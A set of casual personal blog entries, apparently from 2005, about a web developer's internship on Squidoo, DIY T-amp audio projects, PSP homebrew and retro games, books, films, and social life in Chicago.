<p>i need to go home. i have been at work since 12. almost 17 hours. that is messed up.</p>

<p>lakshmi has posted an <a href='http://lakshvivek.blogspot.com/2005/10/squidoo-lens-or-mirage.html'>interesting take on squidoo</a>. I think the hype machine that is in full motion right now is pretty fun to watch. its amazing that seth is able to pull off what ad agencies woudl give a million dollars for. he just flexes and the long tail shakes. hah. seriously though - when i was at C-K, they would have killed for the reaction that seth is getting from his ebook and blog. It is demonstrative of how mis-udnerstood the internet culture is to most marketeers. Seth has it down pat - lets just see if the internet agrees with his vision of net-simplicty. I know that i agree, but the real test will be to see if my mother agrees.</p>

<p>i have to be honest that i am bummed i haven&#8217;t received my beta invitation yet. i want to see how it turned out. the sample screenshots are nice - but i want to see how the lens maker turned out and all that fancy stuff we talked about.</p>

<p>At work we are going to start podcasting. it is going to be awesome. Charlie and I will be the voice of threadless and 15megsoffame. W00t. Stay tuned. and if you must - check out my <a href='http://odeo.com/channel/31095/view'>old trainwreck podcasts</a> on odeo.</p>

<p>I am really excited for my amp parts to start coming tomorrow. I really don&#8217;t know about the enclosure - but i suppose i will live. i did have quite a shock last night researching speakers - my old favorite speakers are only worth about 40 dollars for a pair. people are enjoying them still but they are not expensive. so i have been looking for some ultra high efficiency speakers and i think i am leaning toward some from the triangle line. They seem to be making pretty awesome desktop speakers for around $500. excitment.</p>

<p>all my friends are getting married and i am pissed. haha. i am excited and will have fun. but i hate having to go places with no money. stupid aggressively paying of bills. someday. i will be rich and can fly to des moines on a moments notice. or maybe derek will move here.</p>

                <p>I purchased a t-amp awhile ago and have been listening to it in it stock form for the last 5 days. i am quite impressed with it. It is as good if not better than my receiver i had before. Last time i looked to purchase an amp i was frustrated with the availability of stereo only amps that were of good quality and not crazy expensive. so this is a godsend. haha. stupid god. anyway. i pluggin it in with all the stock cords and it was obvious that using the poor pot/switch for volume, the HORRIBLE speaker wire ports and the evil 1/8 inch stereo cord is not a good idea. so i ordered all the parts last night to rebox it and add some much higher quality parts to the mix. I am going to place it in a Hammons 1402H enclosure, add a 100k pot and add a 12 volt battery to ensure a constant amount of voltage. it should turn out really good. i am not sooo into the hammond enclosure. i kinda want something more unique and nice. but we shall see when it is done. i may really like the industrial way that the hamond enclosure looks. eventually i will be adding a toslink capable DAC, a preamp and a phono preamp to the mix and i woudl like them all to have the same look to the enclosures.</p>

<p>eep. stereo.</p>

<p>epp. back to work.</p>

                <p>So <a href='http://sethgodin.com'>seth godin's</a> newest project is starting to <a href='http://squidoo.com/blog/'> leak out to the world</a>. It is quite exciting to see what we worked on all summer become something real and tactile. I was choosen as an intern around the beginning of the summer and worked with the crew for the summer doing architecture and infrastructure design for the project.</p>

<p>It was a very nice time. I was able to interact with very smart people who really knew a lot about the internet and this whole web 2.0 nonsense. It was invigorating to gather and look at different web sites, people and resources that were shaking up the internet and think about how we can harness that power to make the internet a nicer and easier place.</p>

<p>I am excited for squidoo. <a href='http://squidoo.com'>check it out</a>.</p>

                <p>today was pretty fun.</p>

<p>but first the weekend. My brother came over and hugn out this weekend. we pretty much just played video games. heh. on thrusday we went to sushi wabi. which was really nice. then we went to bed. we got up earlish on friday and dylan accompanied me to work. it was quite fun. we hung out and he fit in really well. he did a bunch of magic tricks for everyone. i gave him to the fullfillment team and they put him to work. then we juggled and just played around. it was fun. then friday night - dylan and i went to penny&#8217;s and then a couple parties around the city. then on saturday - we came back to skinnycorp and hung out - i set up the <a href='http://skinnycorp.com/cam'>webcams</a> and dylan played wolfenstein. then we started playing halflife2 and ruling. around 5 or 6 mark and matiss came over and we played halflife2 for a long time. it was awesome. AWESOME. then on sunday we went to rotofugi and i introduced dylan to the world of fashion, designer toys. he loves them. he bought me a little smorkin wabbit and a little qee. heh. happy. i hope he had fun. i certainly did. i miss hanging out and now it is really nice. we are old enough to just chill and do whatever. and basically just talk about our love of peter sellers. hah</p>

<p>so then dylan left and i came to work. i continued to set up the webcams and finally got them all fancy and working. they rule. today i got my sonic t-amp from thinkgeek. it is all i thought it would be. i am pretty excited to take it home and play with it. it is rather impressive. we hooked it up to these old studio monitors that jeffrey had laying around and then jacob and i walked around outside listening to NWA really loud. it is amazing that it is totally powered by 8 AA batteries. i am seriously amazed. it just sounded very very good. It makes me quite happy. i think if i had more money i would purchase a ready made T-Amp setup. it is just sooo cool. ;)</p>

<p>then we took the t-amp, speakers and a bunch of tshirts and went and attacked clark and belmont threadless style. it ruled. especially since we have the siren. heh. it ruled.</p>

<p>then we hung out and watched joe do the graf wall. check out the <a href='http://skinnycorp.com/videos/october11thswallprogress'>timelapse movie i made</a>. it rules. now it is time to go get breakfast.</p>

                <p>So i have been reading these short, sad, very violent books about society. It is pretty rough.</p>

<p>the first i read was <a href='http://www.amazon.com/exec/obidos/ASIN/0802150616/nata2productions'>A Personal Matter by Kenzoburo Oe</a> which was about this lostish young man whose wife gives birth to a baby with a severe birth defect. The book is about his struggle to understand his life and the violence within it. it is very dark. reminded me a lot of the <a href='http://www.amazon.com/exec/obidos/ASIN/0449911659/nata2productions'>Rabbit</a> books, but wasn&#8217;t as thorough. it was very stark and quite sad. it had these little bursts of ultra violence throughout the book that were surprising and made you wonder about the story. good though. japanese people are weird. hahaha.</p>

<p>the other book i read was obviously not as known and apparently hard to find. it was <a href='http://www.amazon.com/exec/obidos/ASIN/0880013494/nata2productions'>Blueschild Baby by George Cain</a>. If you do come across this book, be sure and pick it up. it is quite powerful. it is a seemingly autobiographical account of a black man living with a herion addiction and being involved in a white world. It is set in the 70s and is pretty easy to imagine. i cringed a lot reading it. a lot of hard parts. a lot of emotions. a lot of sadness. the whole walkind dead that was his harlem was pretty hard to stomach. it is very real.</p>

<p>I am excited to build my fancy amps. I am thinking of making three enclosures: one to experiement, one that is perfect and one to sell. If anyone knows anything about preamps i need some info. specifically - what exactly should i be looking for. I would really like one that is remote controlled. i don&#8217;t really need an EQ or to control tone. i am planning on not having volume on the amps (although it might be a good idea) - so having plain volume, a selector switch and a phono preamp might be it. oh, and really good rca connectors. maybe i will place them all in nice little boxes like <a href='http://www.redwineaudio.com/Clari_T_Amp.html'>red wine audio's</a> stuff has.I am going to have to find a couple nice chassis. I really want three - nice black and about 1/3 of the width of a standard 1U slot and probably 2-3U high. one would be for the amp, one for the preamp and one for the ipod dock. this would really minimize my need for anything else. haha. i mean right now i am using this trashy technics receiver that i purchased in college. i think that the speakers are fine for now. but we shall see. the ipod dock idea is to create a nice little &#8220;slot&#8221; that will hold my ipod and push power to it and take the line out. something nice. and easy. that way i could plug the ipod into it and BAM. it may not be needed since i primarily use my airport express to listen to music. hah. maybe then i should use the airport express and a <a href='http://sound.westhost.com/project85.htm'>nice fancy DAC</a>. hah. or not. this is getting complicated. so as i was saying - 2 chassis, one for the amp and one for the switch/volume pot. hah. word. <a href='http://mywebpages.comcast.net/ampbox/page2.html'>this</a> case would be the goal. but it is expensive. well not too expensive - but i don&#8217;t have the tools to machine the holes i need. i suppose i could buy two of those nice cases and have the holes cut. that would rule. i wonder if i could then get a powered analog pot to control the volume and have that be controlled by some remote. i really just want a remote that does volume up and volume down. something big and cheesey. hah. and it will click.</p>

<p>i played the socom beta today for the psp. it was good.</p>

<p>talking with my friend lakshmi - i am reminded that i should be reading more about software development and design patterns than about hifi equipment. hah.</p>

<p>i am now going to sleep. dreaming of hacking things and playing computers.</p>

                <a href='http://www.nata2.org/index.php?s=gravity%27s+rainbow'>once again</a>
<p>anyway - i often find myself listening to music that is more of the &#8220;classical&#8221; genre on the way to and from work. it is very relaxing and maybe it is <a href='http://www.studynow.com/braintune/'>tuning</a> my brain. lately i have been into these <a href='http://www.google.com/search?q=define%3A+adagio&sourceid=mozilla-search&start=0&start=0&ie=utf-8&oe=utf-8&client=firefox-a&rls=org.mozilla:en-US:official'>adagios</a> because of how sad they are - but today i upped the ante a bit with some philip glass violon concertos.</p>

<p>i think that today&#8217;s entry is rather rediculous - but until i get my new scfi-nerd-singularity books, i am stuck reading insanity.</p>

<p>ahh&#8230; singularity.</p>

                <p>haha.</p>

<p>anyway.. i am going to build out a new stereo for my room. i am pretty excited. It will be a simple inexpensive/expensive hifi system. some good speakers, a preamp, a good amp, a cd player, an ipod dock and that is about it. I have been excited about the <a href='http://www.tnt-audio.com/ampli/t-amp_e.html'>T-amp from Sonic Impact </a>. it is amazing and totally has a little homebrew, hacking movement set around it. I am quite excited - especially about haveing some really cool looking stereo equipment. i love it.</p>

<p>I am casually looking at the <a href='http://www.norh.com/products/norh4/index.html'>Norh4</a> speakers from norh. they are insane. i first found these when seth gave me his <a href='http://www.nata2.org/2005/08/03/damn-i-am-tired-but-i-scored-some-speaker-equipment/'>old broken stuff awhile back</a>. i am lost and confused for the preamp. i thought of getting a cheap switching preamp with no fancy features - so i can plugin all i need. I really need one that has phono in. but that is that. i figure i can get everything for way under 1000. with the speakers being about the most expensive part.</p>

<p>oh yea. all stereo. no more than two speakers. heh. </p>

<p>with this i think i will be rearranging my room. making it more chill. removing the desk. or maybe just making it a better place to hang. i don&#8217;t know. i have a laptop - i rarely use my desktops. i mean i regularly VNC to both of them - but i don&#8217;t need them really (except for quake. stupid stupid quake).</p>

<p>yea.</p>

<p>i am sleepy. and still at work.</p>

<p>the fear demo is cool. wolfenstein et rules. halflife 2 is incredible.</p>

<p>work is fun.</p>

                <p>I have been playing with my PSP a lot more. today on the bus i solved contra. that game is damned hard. seriously. wtf. what kid is going to be able to do that. i barely did with the magic emulator save. screwed up. i also downgraded my other PSP so i could play homebrew on it. ALl i want is to play Y&#8217;s but unfortunantly it totally sucks. haha. so sad.</p>

<p>Isn&#8217;t it a bummer when you try playing a game that is a big part of your memory. and then it sucks. like.. really really sucks. i suppose it goes for anything. not just video games. but with skinnycorp getting their mame cabnit and me hacking my psps i have been playing a lot fo games that i assumed would be awesome. and they are not.</p>

<p>however. hero is awesome. but i digress. i suppose it is like movies too. like when i watched the last starfighter the other day. that sucked. but it still held true to my memory. however. Y&#8217;s did not. it was too slow - the music wasn&#8217;t as ground breaking as it was when Sean Norman and myself played it in his basement. It wasn&#8217;t mind blowing. it was just a really poorly done anime game on a really fancy device. whereas super mario bros 3 was an incredible game still. the graphics held up, the sound was still good. i guess where the games sat in my head is where the expectations laid. super mario bros 3 was always cheesy, always had simple graphics and had obvious eight bit sound. whereas Y&#8217;s was on a CD. a CDROM. it had CD MUSIC!!! and maybe voices(i don&#8217;t remember). and it was on the turbografx(pcengine) so it was seemingly &gt;8bit (when we all knew it wasn&#8217;t). so in my head it was the technical equivelent of a jet pack. FROM THE FUTURE. so playing it and realizing the jet pack a dude hanging from a crane was disappointing. stupid video games.</p>

<p>in other news. working at skinnyCorp rules. I am currently working on 15megsoffame.com. it is quite interesting. the previous developer was good, but we work very differently. and as all coders know - working with someone elses code is like suddenly waking up in someone elses room. it can be weird and a bit alienating. its pretty fun though. wading through lines and lines of code trying to get a grasp on it. then getting a grasp then using it. fun. we are about to get our mame cabinet. <a href='http://extratasty.com/'>launch</a> a couple sites and really rock. ROCK! i am excited. especially cuz i think we are going to start doing some interesting stuff with my friends.</p>

<p>speaking of my friends. i am about to start an online store to sell high end world mobile phones. all gsm, all the time. good ones. i am excited. its called straightupmobile - check it out here. it isn&#8217;t done. this is just a headsup. ;)</p>

<p>also. i am making a site that you will all be apart of. unless you suck. then you won&#8217;t - but nobody who sucks reads my blogs.. right guys.. right.. &#8230; its called illlist.com. i will be sending out invites in a bit. if you are interesting and it has been longer than a bit let me know (i will probably blog about the invites being sent. so if i blog about it and then you don&#8217;t get one. email me. ) it shoudl be dope. i am excited. it may lead to parties.</p>

<p>speaking of parties. i am interested in starting up a small agency/startup party circuit. something really small and chill. like a &#8220;this is our space&#8221; party. something where we can all network. network until we are done. it should lead to business.</p>

<p>i sometimes feel that one of my main skills is that of a networker. it relaly made me think when i read this article about a &#8221;<a href='http://www.inc.com/magazine/20030101/25049.html'>master networker.</a>&#8221; I want to be that. i will be that.</p>
<a href='http://web.mit.edu/chachaoc/www/2005.09.10.Mohawking/index.htm'>getting a mohawk</a>
<p>most of the links on my blog i pull from my <a href='http://del.icio.us/nata2'>del.icio.us</a> feed. how i love my del.icio.us feed. it is a simple thing that really helps me keep track of the internet. which is apaprently big. one thing that i missed about traveling so much and not working when everyone else is working is that i missed all the links that were given out in our <a href='http://corp.dopeman.org'>irc</a> channel. so i made our tinyurl bot post our links to our irc channel&#8217;s <a href='http://del.icio.us/corporate'>del.icio.us account</a>. haha. i will never miss a link again. the source for the bot is at <a href='http://nata2.info/?path=code%2Firc_url_bot'>nata2.info/code</a>. check it out for your own channels. i am NOT a nerd. i promise. i only spend about 40 hours a week on irc.</p>

<p>heh.</p>

<p>oh yea. i am really thinking about going to japan soon. to visit <a href='http://hirominakazawa.com'>hiromi</a>. that woudl be exciting i think. she finally moved to tokyo. and soon she will have her own place. so yea. i woudl like to visit her. and if VOX ever pays me. i will. ;)</p>

                <p>I think it is interesting that i can make a purchase and then use the restroom in a restaurant - but i wasn&#8217;t allowed to before i made the purchase. Like going to starbucks and buying a coffee so i can use the bathroom. the 3 dollars means i could use drugs, kill children or whatever they are trying to stop by making the bathrooms for customers only.</p>

<p>I see this sort of transaction a lot. Making a purchase to gain privilege. I do think it is ripe to be exploited. i just wonder how. and i wonder how many people do it subtly without meaning too.</p>

                <p>So i don&#8217;t usually do it. i only do it when i feel its easy - or maybe when it is hardest. i don&#8217;t really know. i imagine you can totally tell by reading my past entries. regardless of how easy or hard it is - i totally thinkthat i need to blog sometimes. and whether or not i do is a different story. i wish i had a blogging client that made it easy to update my blog in quick places.</p>

<p>some funny things i though yesterday that i wanted to immediately blog were the thought that no matter how big or small i was - i would be able to have basically the same output as i do now. which is very interesting. i like the internet. it doesn&#8217;t matter really who you are, look like, physical present is, or anything - you can achieve in a sense the same as someone else that has the same internet privilege.</p>

<p>my new internet friend who spotted me on the train has a blog &lt;A href=&#8221;http://www.maryheartshector.blogspot.com/&#8221;&gt;here&lt;/a&gt;. check it out.</p>

<p>i am currently attempting to work. and watching the <a href='http://imdb.com/title/tt0327920/'>wilco movie</a>. its pretty good. interesting. i don&#8217;t really know who wilco is - i know the name jeff tweedy - but i haven&#8217;t heard much wilco. its really amazing to hear and see the work process. i would love to be a fly on the wall for many recording sessions. its amazing. i can&#8217;t imagine really.</p>

<p>tonight i went to X/O with my mom and her friend betty. it was of course good. but it wasn&#8217;t as good without my dad, hiromi and matiss there to enjoy it with us. i really miss hiromi. i think i am going to visit soon. i want to. there is no reason why i wouldn&#8217;t.</p>

<p>its raining. i am sleepy.</p>

                <p>Today was cool. I thought up a bunch of interesting ideas. and that was all. jesus. i am tired. i can&#8217;t pay attention for the life of me. its killing me. i am watching Entourage. back a couple days ago i went to an Entourage opening party at crobar. i rode my bike. it was right after i got my bike and had fixed it all up. i had rode it to juggling club then after that swung over to crobar to check out this party. it was a nice party - but it didn&#8217;t make a damn bit of sense and it was on a tuesday night. i was damn tired on the way home.</p>

<p>today on the train someone recognized me from my blog. heh.</p>

<p>i need more sleep or more food. so i am not so tired.</p>

<p>my mom comes tomorrow. i hope we goto X/O</p>

<p>i think i am going to make a mini blog that is just ideas. and thoughts. like about security. it will be tag based - so you can read all blurbs about security, or all blurbs about linux or whatever. just one sentence to one paragraph blurbs. i will call it a blog.</p>

                <p>I just watched the beginning of this <a href='http://imdb.com/title/tt0342804/maindetails'>awesome movie</a>. It was about this women Susan Tom who is raising 11 adopted children all with severe illness or handicaps. It is heart wrenching. I was sitting here trying to find something mindless to put on so i could work with the TV and BAM. sorrow. seriously though - if you have a chance, and a bunch of kleenex - check this movie out. so sad.</p>

<p>anyway. work work work.</p>

                <p>I am glad to be back to work. I can&#8217;t wait to really hit work hard. i feel it coming soon. the work. i am pretty excited.</p>

<p>i am thinking about bulding an intranet haha. just a place to put rss feeds and the like of our various interweb resources.</p>

<p>anyway.. this weekend:</p>

<p>On friday after work i went with jeffrey to a small house warming party at robrob&#8217;s house. it ruled. i picked up a 1.5 firmare PSP for 200 with a couple games. What a deal. i really wanted one to haaxor and play homebrew on it. I grabbed it &#8211; went home. charged it up. and immediately played super mario 2 on it. Man i love emulators. i played Rtype and bomberman 94 on the way to work today. it rules. i was also able to play a bit with backups. Luckily all the ISO&#8217;s i found were of games i already owned (this was both lucky and a bane.. stupid isos). I am gunna need a bigger memory stick. my 512 is painfully full. I wonder if battery life is better if i run Twisted Metal: Head-On from the memory stick versus the UMD. I am excited to play against matiss at twisted metal in different room. i really can&#8217;t wait for socom. however i am worried that the game is going to suck.</p>

<p>anyway.. on friday i met up with Rani, Kira and the like to hang out at bars and such. Kira and i attempted to goto see &#8220;of montreal&#8221; with jeffrey - but were tricked by it being a popular show. so we went to lula and drank a bottle of wine and chilled. Then we went to Rainbo, then to victor hotel, then to redno and then to crobar. you know. a typical friday.</p>

<p>On saturday i slept in. worked a bit and played with my fancy psp. then met Rani, Kira and crew for Rani&#8217;s sorta birthday dinner at this nice Tapas resturant. it was pretty good. Then i went to Erica&#8217;s birthday party and then met everyone at rainbo. Then to tumans. then to a small party at Rani&#8217;s. I slept in and then went to rotofugi to get Rani a birthday present where i met my new PSP buddies. hah. it ruled. Then i went to Rani&#8217;s BBQ. it was quite fun.</p>

<p>After the BBQ i went home, took a nap, played Rtype and then got ready for my VOX night at spybar. Spybar, as usual, sucked. haha. it was ok. but lame. so we went to redno 5 and had a great time. <a href='http://nata2.info/?path=pictures%2Fevents%2F2005%3A09%3A05_Vox_party_at_spybar'>here are pictures</a>. then i had corn beef hash in the middle of the night - which almost killed me. KILLED I SAY!</p>

<p>So yesterday i just worked in front of the TV. i watched meet the fockers, LOTR: ROTK, and gremlins 2. I also got some ISO&#8217;s to boot. how i love torrents.</p>
<a href='http://nata2.info/war/aaron_broussard.mov'>this is horribly sad</a>

                <p>seriously. new orleans got knocked the fuck down. It is amazing how nature can take a piece of something that we think is strong and then remove our conception of strength without even thinking of it. I remember reading the other day about how the hurricane had POUNDED miami and it was going to disrupt the VMAs (oh my god!!) - but no one had even an inkling of how powerful and destructive it could end up being. I guess we now know. I think it is insane that the governor of louisiana is saying that new orleans needs to be abandoned. i wonder if we will rebuild it - or if it will be under water. i heard that it is a city that is below sea level and near the mouth of a river and near a lake and near the ocean - that seems like a bad place for a city. eh.. i guess we all learn from our mistakes..</p>

<p>if you haven&#8217;t - you should donate money to the relief fund. IT IS IMPORTANT. <a href='http://www.amazon.com/gp/philanthropy/red-cross.html/002-7291545-6512808'>go here to donate through amazon. </a> Please do this.</p>

<p>in other words.. today at <a href='http://skinnycorp.com'>skinnyCorp</a> we all hung out and worked (of course) - until jacob got his 6 nerf pistols. we then threw down some <a href='http://skinnycorp.com'>skinnyCorp</a> vs. <a href='http://threadless.com'>threadless</a> justice. it ruled. quite fun. I have fixed and built my new work computer - so tomorrow i will really start working. only took one week to get settled in. i guess i need some shelves and such to make things really nice. i gotta create a home for my homies. and for my yoyos</p>

<p>yea know. yoyos. i love them.</p>

<p>i need to fix my photolog. i will do that now.</p>

<p>so. i HATE movies that have uncomfortable situations.. seriously - along came polly, bottlerocket, and the like. the uncomfortableness makes me really uncomfortable. haha. so much so that i am pausing hitch and then fast forwarding it cuz i can&#8217;t deal with it. it grates on my nerves. but like a horror movie - its nice and fun to have those feelings. although it KILLS me. KILLS. i may have to stop watching and goto bed.</p>

                <p>i remembered that <a href='http://www.simple-answer.com/'>mark verbos</a> was playing his live set at smartbar (and by remember i mean greg told me). It was amazing. Verbos is quite something. i love distortion and hearing it build and seeing him do his little knob thing. haha. so good. i took <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_7610%2F260820050159'>some pictures</a>. He has <a href='http://www.simple-answer.com/MarkVerbos_LiveAcid.mp3'>posted an MP3</a> of what he basically did tonight (albeit tonight was quite a bit harder). you should check it out.</p>

<p>who wants to buy me a 6680?</p>

<p>i don&#8217;t really want to right now.</p>

<p>i have a busy weekend ahead of me. i am excited for work tomorrow. and i am ready for work this weekend. jesus i am going to have a busy fall. but yea. i am excited.</p>

                <p>Seriously. so my chicago car plus card was deactivated cuz my credit card info was invalid and my company(or lack there of) stopped paying for my transit. SO i updated my credit card info, purchased a $75 dollar 30 day pass and called it good. they said to wait 3 days. i attempted - but apparently didn&#8217;t wait 3 solid days - so they deactivated my card again. wtf. so i ordered a new card and then called. The EVIL EVIL women on the phone told me that it was my fault that the card was deactivated cuz i didn&#8217;t wait the three days. however i sorta did wait three days and that was on the 18th. it is now the 26th and the card is deactivated again. so angry. i HATE when customer support people tell me i am wrong. especially when they accuse me of lieing. i am not so receptive of that.</p>

<p>argh. AND i am on hold. seriously. i am gunna punch them.</p>

                <p>So i mistakenly packed this swiss army knife that my brother got for me when he went to switzerland years ago in my carry on luggage. I didn&#8217;t mean to and i had forgotten it was there - cuz i brought it in case i needed it on our road trip. So the airline people took it. Stuff like this always makes me sad. stupid airlines. stupid US being in a fear state. so annoying. I remember in college when a friend of mine brought a 6 inch folding knife on the plane in texas and we were surprised they yelled at him when he tried to bring it back to texas in iowa.</p>

<p>i just read <a href='http://www.amazon.com/exec/obidos/tg/detail/-/1400075793/qid=1123978062/sr=8-1/ref=pd_bbs_1/103-0635108-1839832?v=glance&s=books&n=507846'>this</a>. You should all read it. it is really good. hiromi was reading it but i stole it and read it while on the plane. Really sad. but really good.</p>

<p>And now i am going to prepare for tonight. Looks like i have 3-5 hours before i have to &#8220;perform&#8221; - so i am going to take a nap.</p>

<p>Man i haven&#8217;t had a chance to sit. running around and being crazy. its fun. but i am quite tired.</p>

<p>Tomorrow i fly back to chicago for a VOX event - then i am back to working on sunday. Eep.</p>

<p>I got a PSP last night. it is cool. however it was already upgraded to 1.51 when i got it so none of the hacks work. :-(</p>

<p>I got sunburned again. i hate the sun. i was so careful. then today for some reason i wasn&#8217;t. eep.</p>

<p>i am excited to finally exit the car in a couple hours. but not excited to fly back to chicago so quickly.</p>

<p>i also don&#8217;t want to do work. but it is cool and interesting so i kinda do. i just want money to come from the sky. it is all so confusing. i want to do all this stuff on my own - but i know that getting a job is so much easier. so i have all this cool stuff that i am doing - and it is sorta dependent on me not having a job. and to top it all off - i think skinnycorp really wants to hire me. hah. stupid work. i imagine if i was in chicago or available none of this would be happening - but as i am away and on a road trip - everything is madness.</p>

<p>and my penis is really hot from my laptop. i need to move it. my penis or my laptop.</p>

<p>hahaha</p>

                <p>however.. there is one downside.. the songs do sound the same. but mike said it best: <blockquote><small>
<strong>Mike Compton:</strong> wtf, every one of these songs sounds the same <br />
<strong>Home Aim:</strong> haha <br />
<strong>Mike Compton:</strong> i was all "wow, this is a long song" it was actually already on track 3 <br />

                <p>I am currently working and watching the documentary &#8220;Control Room.&#8221; It is really incredible. Quite something. watching the footage of the hostages being interviewed really brought me back to the feelings i had. It is insane to see the backend of Al Jazeera. They are soo smart; they really had their shit together. it is madness. The discussion of reporter objectivity is very important i think. And listening to the media people change their response to aj jazeera. Pretty insane. I thought it was interesting how every side of the conflict was pissed at Al Jazeerz - and now they are the number one news source. crazy. Also crazy how they would show graphic graphic footage. the US wouldn&#8217;t dare show graphic footage.</p>

<p>If you haven&#8217;t seen the documentary - you need to.</p>

                <p>So i was working with seth - wrapping up my summer gig and hanging out a bit. and he was telling me that he was going to throw out some water damaged audiophile equipment that he had laying around. He then offered me the equipment - and i of course said YES.</p>

<p>Ever since i was a child i have had a nack of gathering broke ass audio equipment - whether it be HUGE 18&#8221; bass cabinets or a 60s reverb box, i have always had a nack of getting some great stuff. so today&#8217;s score isn&#8217;t that weird. but it is some really nice stuff.</p>

<p>This time, however, the stuff is much different. seth was going to throw away: 2 <a href='http://www.decware.com/zpage5.htm'>DecWare Zen Triode Amplifier</a> 2 &lt;A href=&#8221;http://www.norh.com/products/norh9/&#8221;&gt;Norh 9 speakers&lt;/a&gt; 1 &lt;A href=&#8221;http://www.redrosemusic.com/model_three.shtml&#8221;&gt;Red Rose Model Three Preamp&lt;/a&gt;</p>

<p>I have identified them as best i can. they will possibly be different and they will possibly be broke. but i &#8220;gave&#8221; them to mark verbos because he is VERY VERY good at electronics and he follows the mantra that i also believe in &#8221;<strong>Nothing is broken</strong>.&#8221;</p>

<p>Oh yea. Rule. Hopefully mark will get them to work and put them in his studio or something and ROCKING. i hope to make these speakers ROCK. ROCK ROCK ROCK.</p>

<p>It is so goddamn hot in this apartment. I am sooo ready to be home and lay down in my bed. and sleep. sleep. sleep. sleep.</p>

<p>Hiromi is leaving soon. that is a bummer. but we will be hanging out and traveling before she goes. so that will be nice.</p>

<p>hot hot hot.</p>

<p>my mom is coming this weekend with my cousin. it will be fun.</p>

<p>hot hot hot.</p>

<p>enough. my laptop is burning my lap.</p>

                <p>I am in nyc. sitting at tommie&#8217;s apartment - listening to remixes and puffy electro. awesome.</p>

<p>the yoyo contest was a lot of fun. i inadvertently may have starred in my first &#8220;porn&#8221; movie. As a joke on another yoyo player - me and some Duncan kids got naked and recorded over some of their &#8220;choice footage.&#8221; Oh yes. it ruled. however. may or will be quite scandalous. Another strike against my presidential campaign. I need to stop taking off all my clothes at parties. here are pictures: <a href='http://flickr.com/photos/natatwo/sets/663077/'>flickr</a> and <a href='http://nata2.info/?path=pictures%2Fevents%2F2005%3A07%3A29_World_YoYo_Contest'>nata2</a>.</p>

<p>I am working for seth again this week. it should be nice to see the crew and meet the jakes. FUN FUN. ;) oh and test out my new laptop.</p>

<p>i will be excited to be back and see everyone.</p>

<p>next week i will be hanging with my mom and my cousin. rule. hah i need to get a neighborhoody.</p>

                <p>I just finished the newest harry potter book. I quite enjoyed it. (i have turned the spiolers white - unless you are in an RSS reader)<i style='color: #fff;'> I was of course about dumbledore's demise and snape turning(hah) evil. but i was more bummed about harry's ejection of ginny. WHY. they are so cute. hahaha. </i></p>

<p>anyway. i am &#8220;stuck&#8221; at Tommie&#8217;s house here in Brooklyn - with internet and directtv. stuck isn&#8217;t so much the situation as i didn&#8217;t really make any moves to find another place to stay. and i lost my other options number. hah. lame. well not really. i can finally get some work done. Tommie has these three dogs. they are Italian miniature greyhounds. totally insane. like little rat creatures. one is blind. looks as though he has clouds for eyes. they are really quite something. i want to live somewhere where i can have dogs or cats - but i want them to be self supportive(except for feeding). I want a big enough house and surrounding grounds where i don&#8217;t have to walk them. that is a goal.</p>

<p>stupid harry.</p>

<p>Tomorrow i really have to work hard. I have so much to do. hmm. maybe i will start tonight. Yes. yes i will.</p>

<p>i can&#8217;t wait to get back to Chicago and see all my friends. i miss them. its annoying not being free to do whatever i want.</p>

<p>although i seriously couldn&#8217;t ask for a better prison. haha.</p>

<p>btw. i LOVE reading.</p>

                <p>So my life was in shambles. but i am feeling it come back. For one. i cleaned my room. that seriously helped. I didn&#8217;t know i had so much space. i coudl sleep anywhere. basically all i did was remove all the geeky stuff. like the cell phones, the computers, the audreys and the like. the second thing i did - was fix my computers. I changed up hard drives. merged my MP3 Libraries. and all that. So now rather than two disparate libraries i have one 60g one. nicer. i now need to finish that and copy it to its own HD and make everything happy. For third i am finally getting caught up on work. i had a very very good work day today and if i ever get tomorrow i imagine i will have one tomorrow as well.</p>

<p>My laptop should arrive shortly. Dell&#8217;s order status could give a person a nightmere.</p>

<p>i am not sleepy. but i guess that is what happens when you have barely been awake for 15 hours. i guess that is the recommended amount.</p>

<p>I kinda want to convert myself back into my old style of sleeping. i liked the 9-5 awake. 7-10 asleep. 11-4 awake. 4-8 sleep. a total of 14 awake hours and 7 sleep hours with a couple grace hours sprinkled for good luck. i really feel this maximizes the amount of work, play and sleep i can get. it also mazimizes my productivity and increases craziness. all good things.</p>

<p>ok gnight</p>

                <p>I am having a hell of a time staying on task. I really have NO idea what day it is or where i am. haha. well i know i am on my couch. watching shitty TV and wishing i had an office. But soon it will all change.</p>

<p>I have been planning a bit more, attempting to really solidify exactly what i am going to do for the next couple hours. I will soon be getting an office and my new laptop should arrive shortly. Really all i want is the new laptop. I need something that doesn&#8217;t hurt my hands when i am typing on it. I miss my thinkpad soo much. It was so nice. i liked how many fancy little things it had. it was like they had though everything out. hah. tech companies never think things out. NEVER. so my new little dell better rule!! or i will be mad.</p>

<p>I really want to get back into rails development. it is so much fun. maybe i will go to the <a href='http://www.rubycentral.org/conference/'>ruby con</a> and see whats happening</p>

<p>This weekend was a good time. the <a href='http://www.intonationmusicfest.com/'>intonation festival</a> was pretty cool. i really don&#8217;t like live music, nor do i like being hot and sweaty. But it turned out to be quite fun. check out the pictures <a href='http://nata2.info/?path=pictures%2Fevents%2F2005%3A07%3A18_intonation_fest'>here</a> or <a href='http://flickr.com/photos/natatwo/sets/611335/'>here</a>. Hiromi and Marcia hung out. Shawn and Valerie were there. and i hung out with Rani and Kira whom yoyos introduced me to. It was pretty fun. Te best was dancing at the afterparty. i was exhausted after all of the festivities and slept forever.</p>

<p>speaking of which. i need to goto bed.</p>

<p>but first. tonight i saw Charlie and the Chocolate family. It was awesome. the best thing ever. so awesome. i loved it.</p>

                <p>no job for me.</p>

<p>i have lots and LOTS of things going on.</p>

<p>Here is my travel schedule - so if you are around during these times let me know</p>

<p>07/28-07/30: Orlando - world yoyo contest 07/30-08/04: NYC - work 08/11-08/13: colorado - play/work</p>

<p>come play. it would be fun.</p>

<p>I desprately need a new laptop. seriously. this is killing me. i had to give my old laptop back to my work - so now i am back to my mini me laptop. so so little. and not at all good. it is SOO slow. but more importantly it is relaly little, and is causing my wrists pain. So i need to save my money and get a new one. i want an ibm/lenova - cuz i really liked my old ibm. I wish i could just buy one. haha. but they are expensive. so if anyone knows of any good laptop brands that are not super expensive let me know.</p>

<p>i need some braces and some gears and stepper motors to make my robot gun out of my electronic airsoft gun. i have the stamp2 to control it. i think i coudl use legos and servos. but i want it to move a bit faster. couple it with a webcam. and BAM i have a computer controlled bruising machine. w00t.</p>

